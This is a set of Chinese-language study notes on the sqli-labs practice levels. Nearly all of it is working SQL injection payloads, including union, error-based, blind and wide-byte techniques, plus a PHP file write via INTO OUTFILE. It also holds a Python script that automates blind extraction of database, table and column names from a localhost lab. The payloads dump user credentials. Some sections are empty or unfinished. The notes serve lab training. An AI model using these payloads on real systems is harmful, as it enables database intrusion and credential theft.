[TOC]



# L1

## 首先判断注入类型



输入id=1'产生错误

![](U:\doc\web\sqli-labs\pic\1.png)



输入id=1“没有错误

![2](U:\doc\web\sqli-labs\pic\2.png)



产生字符型注入



## 判断列的数量



```sql
/?id=1' order by 1
```



order by后的数字表示的是列。

将列的大小变大直到出错则可以知道列的数量



## 获取数据库名称



### 判断哪些列可以被输出



```sql
/?id=1' union select 1,2,3
```

观察输出即可知道哪些列被输出



###  数据库名称



```sql
/?id=1' union select 1,2,database() --+
```



## 获取表名



```sql
/?id=1' union select 1,2,group_concat(table_name) from information_schema.tables where schemata=database() --+
```



## 获取列名



```sql
/?id=1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users' --+
```



## 获取用户名与密码



```sql
/?id=1' union select 1,2,group_concat('|',username,' ',password,'|') from users --+
```





# L5



## 获取数据库名



```sql
/?id=-1' union select 1,count(*),concat((select schema_name from information_schema.schemata  limit 0,1),floor (rand()*2)) as a from information_schema.tables group by a --+
```



## 获取表名



```sql
/?id=-1' union select 1,count(*),concat((select table_name from information_schema.tables where table_schema=database()  limit 0,1),floor (rand()*2)) as a from information_schema.tables group by a --+
```



## 获取列名



```sql
/?id=-1' union select 1,count(*),concat((select column_name from information_schema.columns where table_name='users'  limit 0,1),floor (rand()*2)) as a from information_schema.tables group by a --+
```



## 获取密码



```sql
/?id=-1' union select count(*),concat((select concat(username,':',password) from security.users  limit 0,1),floor (rand()*2)) as a from security.users group by a --+
```





# L7



## 判断权限



```sql
/?id=1')) and (select count(*) from mysql.user)>0 --+
```

回显正常，存在权限



## 获取文件目录长度



```sql
/?id=1')) and length(@@datadir)>$n --+
```

盲注获取长度



## 获取文件目录



```sql
/?id=1')) and ascii(substr(@@datadir,$n,1))=ascii('$c') --+
```

盲注获取文件目录



## 写入文件



```sql
/?id=1')) union select '','','<?php echo "hacked"?> ' into outfile '$dirdata' --+
```







# L8



## 获取数据库名长度



```sql
/?id=1' and length(database())=$n
```



## 获取数据库名



```sql
/?id=1' substr(database(),1,1)='$v'
```



## 获取表名长度



```sql
/?id=1'  
```





## 脚本



```python
import requests
import re

def GetDataBaseName(code,url,right):
    addcode=" and length(database())="
    i=0
    max=256
    databasename=""
    databaselen=0
    while(1):
        r=requests.get(url,params=code+addcode+str(i)+"--+")
        if(re.search(right,r.text)):
            databaselen=i
            break
        else:
            i+=1

    i=1
    while(i<databaselen+1):
        j=0
        while(j<max):
            addcode=" and ascii(substr(database(),"+str(i)+",1))="+str(j)+" --+"
            r=requests.get(url,params=code+addcode)
            if(re.search(right,r.text)):
                databasename+=chr(j)
                break
            j+=1
        i+=1

    return databasename

def GetTable(code,url,right,databasename):
    tablelist=[]
    tablefin=0
    basefin=0

    i=1
    j=1
    i=0
    while(1):
        tablename=""
        j=1
        while(1):
            k=0
            while(k<128):
                addcode=" and ascii(substr((select table_name from information_schema.tables where table_schema='"+databasename+"' limit "+str(i)+",1),"+str(j)+",1))="+str(k)+" --+"
                r=requests.get(url,code+addcode)
                if(re.search(right,r.text)):
                    if(k==0 and j==1):
                        basefin=1
                        break
                    elif(k==0):
                        tablefin=1
                        break
                    else:
                        tablename+=chr(k)
                        break
                k+=1
            if(k==128):
                basefin=1
                break
            j+=1
            if(tablefin==1):
                tablefin=0
                break
            if(basefin==1):
                break
        if(basefin==1):
            break
        i+=1
        tablelist.append(tablename)
    return tablelist

def GetColumn(code,url,right,tablename):
    columnlist=[]
    tablefin=0
    columnfin=0
    i=0
    while(1):
        columnname=""
        j=1
        while(1):
            k=0
            while(k<128):
                addcode=" and ascii(substr((select column_name from information_schema.columns where table_name='"+tablename+"' limit "+str(i)+",1),"+str(j)+",1))="+str(k)+" --+"
                r=requests.get(url,code+addcode)
                if(re.search(right,r.text)):
                    if(k==0 and j==1):
                        tablefin=1
                        break
                    elif(k==0):
                        columnfin=1
                        break
                    else:
                        columnname+=chr(k)
                        break
                k+=1
            if(k==128):
                tablefin=1
                break
            j+=1
            if(columnfin==1):
                columnfin=0
                break
            if(tablefin==1):
                break
        if(tablefin==1):
            break

        i+=1
        columnlist.append(columnname)
    return columnlist


code="id=1'"
right="You are in..........."
url="http://localhost/sqli-labs-master/Less-8"
data={'id':code}
databasename="security"
databasename=GetDataBaseName(code,url,right)
print("DataBaseName:",databasename)
tablelist=GetTable(code,url,right,databasename)
print(tablelist)
tablename='users'
print("table name:",tablename)
columnlist=GetColumn(code,url,right,tablename)
print(columnlist)

```



# L23



## 获取列数



```sql
/?id=1' order by 1 ||'1
```



##  获取数据库名



```sql
/?id=-1' union select '1',database(),'3
```



## 获取表名



```sql
/?id=-1' union select '1',(select group_concat(table_name) from information_schema.tables where table_schema=database()),'3
```



## 获取列名



```sql
/?id=-1' union select 1,(select group_concat(column_name) from information_schema.columns where table_name='users'),'3
```



## 获取用户名与密码



```sql
/?id=-1' union select 1,(select group_concat(username) from security.users ),'3
/?id=-1' union select 1,(select group_concat(password) from security.users ),'3
```





# L24



## 





# L26





# L32



## 获取数据库名



```sql
/?id=-1%DF%27 union select 1,2,database() --+
```



## 获取表



```sql
/?id=-1%DF%27 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+
```



## 获取列名



```sql
/?id=-1%DF%27 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=0x7573657273 --+
```



## 获取用户名与密码



```sql
/?id=-1%DF%27 union select 1,2,group_concat(concat(username,password)) from users --+
```





# L46



## 获取数据库名



```sql
/?sort=1 and updatexml(1,concat('~',database()),0)
```



## 获取表名



```sql
/?sort=1 and updatexml(1,concat('~',(select group_concat(table_name)from information_schema.tables where table_schema=database())),0)
```



## 获取列名



```sql
/?sort=1 and updatexml(1,concat('~',(select group_concat(column_name) from information_schema.columns where table_name='users')),0)
```



## 获取用户名与密码



```sql
/?sort=1 and updatexml(1,concat('~',(select group_concat('|',username,':',password,'|') from users )),0)
```

